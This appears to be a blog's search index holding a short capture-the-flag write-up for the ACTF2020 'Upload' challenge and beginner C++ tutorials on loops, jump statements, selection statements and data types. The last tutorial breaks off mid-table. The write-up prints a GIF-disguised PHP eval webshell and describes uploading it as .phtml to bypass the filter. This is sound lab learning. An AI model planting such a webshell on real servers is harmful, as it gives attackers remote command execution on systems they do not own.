<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ACTF2020 新生赛 Upload</title>
    <url>/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</url>
    <content><![CDATA[<p>同样是一道上传题，上传已有木马</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162637320.png" alt="image-20211202162637320"></p>
<span id="more"></span>

<p>换gif木马重新尝试</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162755354.png" alt="image-20211202162755354"></p>
<p>上传成功，打开指定网址查看是否有上传文件</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162849704.png" alt="image-20211202162849704"></p>
<p>果然有</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162906119.png" alt="image-20211202162906119"></p>
<p>接着打开蚁剑连接，发现</p>
<p><strong><u>上传的图片中的代码不能用</u></strong></p>
<p>换方法</p>
<p>随便上传一个图片，然后修改其后缀和内容</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173541721.png" alt="image-20211202173541721"></p>
<p>改为php后，不通过，则改为phtml</p>
<p>并插入代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如图</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173720354.png" alt="image-20211202173720354"></p>
<p>提交后</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173743862.png" alt="image-20211202173743862"></p>
<p>进入蚁剑连接</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173834016.png" alt="image-20211202173834016"></p>
<p>在根目录下得到flag</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173912850.png" alt="image-20211202173912850"></p>
]]></content>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的循环结构和跳转语句</title>
    <url>/2021/12/16/C-%E4%B8%AD%E7%9A%84%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="一、循环结构"><a href="#一、循环结构" class="headerlink" title="一、循环结构"></a>一、循环结构</h1><h2 id="1-while循环结构"><a href="#1-while循环结构" class="headerlink" title="1.while循环结构"></a>1.while循环结构</h2><p>作用：满足循环条件，执行循环语句</p>
<p>语法：<code>while(循环条件)&#123;循环语句&#125;</code></p>
<p>解释：只要满足循环条件即执行循环语句，直到条件不符合时才停止</p>
<span id="more"></span>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(n&lt;<span class="number">10</span>)          <span class="comment">//打印1~10</span></span><br><span class="line">    &#123;</span><br><span class="line">        n++;</span><br><span class="line">        cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-do…while循环语句"><a href="#2-do…while循环语句" class="headerlink" title="2.do…while循环语句"></a>2.do…while循环语句</h2><p>作用：先执行一次循环语句，再判断循环条件</p>
<p>语法：<code>do&#123;循环语句&#125; while(循环条件);</code></p>
<p>注意：与while循环语句的主要区别就是第一次判断的先后</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        n++;</span><br><span class="line">        cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(n&gt;<span class="number">10</span>);<span class="comment">//此程序会输出1，而while程序则什么也不输出</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-for循环语句"><a href="#3-for循环语句" class="headerlink" title="3.for循环语句"></a>3.for循环语句</h2><p>语法：<code>for(起始表达式；条件表达式；末尾循环体)&#123;循环语句；&#125;</code></p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>;n&lt;<span class="number">10</span>;n++)<span class="comment">//此处用分号分割</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-嵌套循环"><a href="#4-嵌套循环" class="headerlink" title="4.嵌套循环"></a>4.嵌套循环</h2><p>作用：在循环体中再嵌套一层循环，解决一些实际问题</p>
<p>示例：</p>
<p>打印*阵图</p>
<p><img src="/2021/12/16/C-%E4%B8%AD%E7%9A%84%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/image-20211217200102802.png" alt="image-20211217200102802"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;* &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、跳转语句"><a href="#二、跳转语句" class="headerlink" title="二、跳转语句"></a>二、跳转语句</h1><h2 id="1-break语句"><a href="#1-break语句" class="headerlink" title="1.break语句"></a>1.break语句</h2><p>作用：用于跳出选择结构或者循环结构</p>
<p>break的使用时机</p>
<ul>
<li>出现在switch条件语句中，作用是终止case并跳出switch</li>
<li>出现在循环语句中，作用是跳出当前循环语句</li>
<li>出现在嵌套中，作用是跳出最近的内层嵌套语句</li>
</ul>
<h2 id="2-continue语句"><a href="#2-continue语句" class="headerlink" title="2.continue语句"></a>2.continue语句</h2><p>作用：在循环语句中，跳过本次循环中余下尚未执行的语句，继续执行下一次循环</p>
<p>示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">continue</span>;<span class="comment">//不输出偶数  </span></span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        cout&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-goto语句"><a href="#3-goto语句" class="headerlink" title="3.goto语句"></a>3.goto语句</h2><p>作用：无条件跳转语句</p>
<p>语法：<code>goto 标记;</code></p>
<p>解释：如果标记的名称存在的，执行goto语句时，会跳转到标记位置。（但是一般不用）</p>
<p>例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">goto</span> flag;<span class="comment">//跳转到flag语句</span></span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3&quot;</span>&lt;&lt;endl;</span><br><span class="line">    flag:</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的选择选择语句</title>
    <url>/2021/12/11/C-%E4%B8%AD%E7%9A%84%E9%80%89%E6%8B%A9%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h1 id="一、if条件语句"><a href="#一、if条件语句" class="headerlink" title="一、if条件语句"></a>一、if条件语句</h1><p>作用：执行满足条件的语句</p>
<p>if语句的三种形式</p>
<ul>
<li>单行格式if语句</li>
<li>多行格式if语句</li>
<li>多条件的if语句</li>
</ul>
<span id="more"></span>

<h2 id="1-单行格式if语句"><a href="#1-单行格式if语句" class="headerlink" title="1.单行格式if语句"></a>1.单行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//注意此处没有;</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-多行格式if语句"><a href="#2-多行格式if语句" class="headerlink" title="2.多行格式if语句"></a>2.多行格式if语句</h2><p>语法：<code>if(条件)&#123;条件满足时执行的语句&#125;else&#123;条件不满足是执行的语句&#125;;</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-多条件的if语句"><a href="#3-多条件的if语句" class="headerlink" title="3.多条件的if语句"></a>3.多条件的if语句</h2><p>语法：<code>if(条件1)&#123;条件1满足时执行的代码&#125;else if(条件2)&#123;条件2满足时执行的代码&#125; ... else&#123;以上条件都不满足执行的语句&#125;</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)<span class="comment">//第一个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">400</span>)<span class="comment">//第二个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得还行&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">300</span>)<span class="comment">//第三个条件</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得有点差&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-嵌套if语句"><a href="#4-嵌套if语句" class="headerlink" title="4.嵌套if语句"></a>4.嵌套if语句</h2><p>if语句里面还有if语句</p>
<p>注意if嵌套语句中条件的大小顺序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    cin&gt;&gt;score;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(score&gt;<span class="number">500</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;考得不错&quot;</span>&lt;&lt;endl;<span class="comment">//此处判断条件要从大到小，否则无法正常运行</span></span><br><span class="line">        <span class="keyword">if</span>(score&gt;<span class="number">650</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望985&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">600</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望211&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;有望一本&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;继续加油吧&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、三目运算符"><a href="#二、三目运算符" class="headerlink" title="二、三目运算符"></a>二、三目运算符</h1><p>作用：通过三目运算符实现简单的判断</p>
<p>语法：<code>条件 ? 代码1 : 代码2</code></p>
<p>解释：</p>
<p>如果满足条件，则执行代码1，否则执行代码2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b;<span class="comment">//注意此处为&gt;&gt;而不是,</span></span><br><span class="line">    </span><br><span class="line">    c=(a&gt;b?a:b);</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    (a&gt;b?a:b)=<span class="number">50</span>;<span class="comment">//三目运算符同样可以这样使用，表示将a b中较大的一个赋值为50</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、switch条件语句"><a href="#三、switch条件语句" class="headerlink" title="三、switch条件语句"></a>三、switch条件语句</h1><p>作用：执行多条件分支语句</p>
<p>语法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(表达式)</span><br><span class="line">    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">1</span>:执行语句;<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">2</span>:执行语句;<span class="keyword">break</span>;  </span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:执行语句;<span class="keyword">break</span>;    </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;prefect&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">//此处一定不要忘记break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;normal&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;bad&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>switch缺点：判断时只能是整型或者字符型，不可以是区间，而if可以</p>
<p>switch有点：结构清晰，执行效率高</p>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++数据类型及数据的运用</title>
    <url>/2021/12/08/C-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="C-程序初始代码"><a href="#C-程序初始代码" class="headerlink" title="C++程序初始代码"></a>C++程序初始代码</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码初学者只需背下即可，每个程序都要有。</p>
<span id="more"></span>

<h1 id="C-注释"><a href="#C-注释" class="headerlink" title="C++注释"></a>C++注释</h1><h2 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h2><p>用法：<code>//描述信息</code></p>
<p>通常放在一行代码的上方或后面，对该代码进行说明。</p>
<p>如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;endl; <span class="comment">//输出hello word</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h2><p>用法：<code>/*描述信息*/</code></p>
<p>通常放在一段代码上方，对该代码做整体说明。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    输出hello world</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="C-数据量"><a href="#C-数据量" class="headerlink" title="C++数据量"></a>C++数据量</h1><h2 id="变量创建的语法"><a href="#变量创建的语法" class="headerlink" title="变量创建的语法"></a>变量创建的语法</h2><p><code>数据类型 变量名 = 变量初始值</code></p>
<p>例如 <code>int a = 10;</code></p>
<p>注意：</p>
<ul>
<li><p>关键字不能作为变量的名称（标识符）</p>
</li>
<li><p>标识符只能由字母、数字、下划线组成</p>
</li>
<li><p>第一个字符必须为字母或下划线</p>
</li>
<li><p>标识符中字母区分大小写</p>
</li>
<li><p>标识符尽量用有阅读性的英文字母，而不要单纯的a、b、c</p>
</li>
</ul>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>作用：用于记录程序中不可更改的数据</p>
<p>C++定义常量的两种方式</p>
<h3 id="define-宏常量：-define-常量名-常量值"><a href="#define-宏常量：-define-常量名-常量值" class="headerlink" title="#define 宏常量：#define 常量名 常量值"></a>#define 宏常量：<code>#define 常量名 常量值</code></h3><p>通常在文件上方定义，表示一个常量，比如定义pi=3.1415926</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;pi&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="const-修饰的变量：const-数据类型-常量名-常量值"><a href="#const-修饰的变量：const-数据类型-常量名-常量值" class="headerlink" title="const 修饰的变量：const 数据类型 常量名 = 常量值"></a>const 修饰的变量：<code>const 数据类型 常量名 = 常量值</code></h3><p>通常在变量定义之前加关键字const，修饰该变量为常量，不可修改</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">int</span> a = <span class="number">12</span>;</span><br><span class="line">     cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>C++规定在创建每一个变量或常量时，必须要指定出相应的数据类型，否则无法为其分配内存</p>
<h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p>作用：整型变量表示的是整数类型的数据</p>
<p>区别：占用空间不同，表示范围不同</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
<th>取值范围</th>
</tr>
</thead>
<tbody><tr>
<td>short（短整型）</td>
<td>2字节</td>
<td>（-2^15~2^15-1）</td>
</tr>
<tr>
<td>int（整型）常用</td>
<td>4字节</td>
<td>（-2^31~2^31-1）</td>
</tr>
<tr>
